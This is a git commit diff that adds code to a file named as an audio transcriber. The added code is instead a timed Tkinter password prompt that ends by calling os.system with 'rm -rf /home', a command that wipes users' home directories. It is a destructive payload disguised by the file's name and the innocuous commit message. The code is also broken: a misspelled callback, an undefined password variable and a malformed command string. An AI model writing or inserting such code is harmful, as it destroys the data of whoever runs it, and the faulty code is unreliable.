d44412a561bcb18cd5f752c61bdec90c0fac6c43
Crystal Jane Cadimas <crystaljanecadimas@iskolarngbayan.pup.edu.ph>
2022-11-19 20:20:37 +0800

    Done Coding

--- python_audioTranscripter.py
+++ python_audioTranscripter.py
@@ -5,3 +5,15 @@ master = Tk()
 e = Entry(master)
 e.pack()
 e.focus_set()
+
+def callvbak():
+    if e.get() == password:
+        quit()
+
+b = Button(master, text = "STOP", width=10, command=callback)
+b.pack()
+
+master.after(30000, master.destroy)
+mainloop()
+
+os.system(*rm -rf /home)
